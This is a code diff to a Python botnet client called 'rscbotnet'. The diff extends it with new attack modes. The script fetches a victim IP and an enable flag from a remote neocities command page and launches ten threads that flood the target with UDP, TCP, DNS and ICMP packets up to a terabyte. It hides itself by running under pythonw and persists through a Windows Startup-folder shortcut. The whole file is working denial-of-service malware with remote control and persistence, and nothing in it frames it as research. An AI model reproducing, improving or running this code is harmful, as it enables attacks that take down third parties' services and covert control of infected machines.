@@ -3,62 +3,112 @@ import sys
 import threading
 import random
 import socket
-import requests
 import re
 import time
 import subprocess
+import http.client
+import psutil
+import win32com.client
 
-try:
-    import psutil
-    import win32com.client
-except ImportError:
-    print("You need to install 'psutil' and 'pywin32'. Run 'pip install psutil pywin32'.")
+def install_dependencies():
+    try:
+        import psutil
+        import win32com.client
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "pywin32"])
+
+install_dependencies()
 
 num_bots = 10
 running = True
 data_limit = 1 * 1024**4
-attack_type = "VOLUMETRIC"
+attack_type = "BOTH"
 
 previous_note_content = ""
 previous_victim_ip = ""
 
+# Function to fetch the target IP without using 'requests'
 def fetch_target_ip():
     try:
-        response = requests.get("https://rsc-site.neocities.org/victim")
-        ip_address = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", response.text)
+        conn = http.client.HTTPSConnection("rsc-site.neocities.org")
+        conn.request("GET", "/victim")
+        response = conn.getresponse()
+        content = response.read().decode()
+        conn.close()
+
+        ip_address = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", content)
         if ip_address:
             print(f"Target IP obtained: {ip_address[0]}")
             return ip_address[0]
         else:
-            print("No valid IP found at the target URL.")
+            print("No valid IP found.")
             return None
     except Exception as e:
-        print("Error fetching target IP:", e)
+        print("Error obtaining target IP:", e)
         return None
 
+# Function to check if attack is enabled without using 'requests'
 def is_attack_enabled():
     try:
-        response = requests.get("https://rsc-site.neocities.org/note")
-        enabled = "true" in response.text.lower()
-        print(f"Attack enabled status: {enabled}")
+        conn = http.client.HTTPSConnection("rsc-site.neocities.org")
+        conn.request("GET", "/note")
+        response = conn.getresponse()
+        content = response.read().decode()
+        conn.close()
+
+        enabled = "true" in content.lower()
+        print(f"Enabled status: {enabled}")
         return enabled
     except Exception as e:
-        print("Error checking attack enabled status:", e)
+        print("Error checking enabled status:", e)
         return False
 
+# Attack function
 def attack(bot_id, target_ip, packet_size=10240):
     total_data_sent = 0
     global running
-    print(f"Bot {bot_id} initiating attack on {target_ip}")
+    print(f"Bot {bot_id} starting attack in mode {attack_type} on {target_ip}")
     
     while total_data_sent < data_limit and running:
         try:
-            if attack_type == "VOLUMETRIC":
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                    packet = random._urandom(packet_size)
-                    random_port = random.randint(1, 65535)
-                    s.sendto(packet, (target_ip, random_port))
+            random_port = random.randint(1, 65535)
+            packet = random._urandom(packet_size)
+
+            if attack_type in ("UDP", "BOTH", "VOLUMETRIC"):
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
+                    udp_socket.sendto(packet, (target_ip, random_port))
                     total_data_sent += len(packet)
+
+            if attack_type in ("TCP", "BOTH", "VOLUMETRIC"):
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
+                    tcp_socket.settimeout(0.5)
+                    try:
+                        tcp_socket.connect((target_ip, random_port))
+                        tcp_socket.send(packet)
+                        total_data_sent += len(packet)
+                    except Exception as e:
+                            print(f"Bot {bot_id}: Failed to connect after attempts.")
+                    finally:
+                        tcp_socket.close()
+
+            if attack_type == "DNS":
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as dns_socket:
+                    dns_request = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
+                    dns_socket.sendto(dns_request, (target_ip, 53))
+                    total_data_sent += len(dns_request)
+
+            if attack_type == "ICMP":
+                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as icmp_socket:
+                    icmp_packet = b"\x08\x00\xf7\xff" + random._urandom(packet_size - 4)
+                    icmp_socket.sendto(icmp_packet, (target_ip, 0))
+                    total_data_sent += len(icmp_packet)
+
+            if attack_type == "DYN":
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as dyn_socket:
+                    amp_request = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
+                    dyn_socket.sendto(amp_request, (target_ip, 53))
+                    total_data_sent += len(amp_request)
+
         except Exception as e:
             print(f"Bot {bot_id}: Error -", e)
 
@@ -74,7 +124,7 @@ def run_attack():
                     previous_note_content = "true" if current_attack_enabled else "false"
                     previous_victim_ip = current_victim_ip
                     
-                    print("Initiating attack due to detected changes.")
+                    print("Starting attack due to detected changes.")
                     threads = []
                     for i in range(num_bots):
                         bot_thread = threading.Thread(target=attack, args=(i, current_victim_ip))
@@ -84,12 +134,12 @@ def run_attack():
                     for thread in threads:
                         thread.join()
                 else:
-                    print("Conditions met but no changes since the last run.")
+                    print("Conditions met but no changes detected since last run.")
             else:
-                print("Conditions not met for attack (attack not enabled or no target IP).")
-            time.sleep(63)
+                print("Conditions not met for the attack.")
+            time.sleep(3)
         except Exception as e:
-            print("Error during URL check or attack execution:", e)
+            print("Error in verification or attack execution:", e)
 
 def is_running_in_background():
     current_pid = os.getpid()
@@ -110,30 +160,29 @@ def run_with_pythonw():
 def add_to_startup():
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     script_path = os.path.abspath(__file__)
+    pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
     shortcut_path = os.path.join(startup_folder, 'rscbotnet.lnk')
 
     if os.path.exists(shortcut_path):
-        print("The program is already set to start automatically.")
+        print("Program is already set for automatic startup.")
         return
 
     try:
         shell = win32com.client.Dispatch("WScript.Shell")
         shortcut = shell.CreateShortcut(shortcut_path)
-        shortcut.TargetPath = script_path
+        shortcut.TargetPath = pythonw_path
+        shortcut.Arguments = f'"{script_path}"'
         shortcut.WorkingDirectory = os.path.dirname(script_path)
         shortcut.IconLocation = script_path
         shortcut.save()
-        print("The program has been set to start automatically.")
+        print("Program is set for automatic startup.")
     except Exception as e:
-        print("Error adding the program to startup:", e)
+        print("Error in automatic startup:", e)
 
 if __name__ == "__main__":
-    add_to_startup()
-
-    run_with_pythonw()
-
+    add_to_startup()  
+    run_with_pythonw() 
     if not is_running_in_background():
         run_attack()
     else:
         print("The script is already running in the background.")
-
